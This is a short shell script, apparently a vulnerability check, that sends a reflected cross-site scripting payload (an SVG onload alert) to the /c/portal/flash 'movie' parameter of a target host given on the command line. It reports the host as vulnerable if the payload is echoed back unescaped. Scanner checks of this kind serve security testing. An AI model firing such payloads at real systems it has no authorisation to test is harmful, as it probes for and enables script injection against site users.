exitValue=1

VAR="$(curl -s -L -m 3 "http://$1/c/portal/flash?movie=\"><svg+onload=alert(1)>")"

if echo "$VAR" | grep -q 'new SWFObject("\x22\x3e\x3csvg\x20onload\x3dalert\x281\x29\x3e"'; then
    exitValue=0
fi

exit $exitValue